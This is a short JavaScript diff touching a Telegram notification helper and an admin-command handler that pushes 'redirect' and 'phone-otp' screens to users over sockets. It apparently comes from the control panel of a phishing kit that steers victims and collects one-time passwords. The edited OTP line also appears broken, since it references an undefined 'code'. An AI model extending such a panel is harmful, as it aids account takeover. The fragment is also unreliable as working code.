@@ -136,7 +136,7 @@ async function sendTelegramMessage(botToken, chatId, text, options = {}) {
         body: JSON.stringify({
           chat_id: chatId,
           message_id: messageId,
-          text: text + "\n\ncommand not available",
+          text: text + "\n\n✅Command not available",
           parse_mode: "HTML"
         })
       }
@@ -561,7 +561,7 @@ async function handleAdminCommand({ userId, command, otp, io, db }) {
       if (link) {
         socket.emit("user:command", { command: "redirect", link });
       } else if (otp) {
-        socket.emit("user:command", { command: "phone-otp", code: otp, phonescreen });
+        socket.emit("user:command", { command: "phone-otp", code, phonescreen });
       } else {
         socket.emit("user:command", { command });
       }
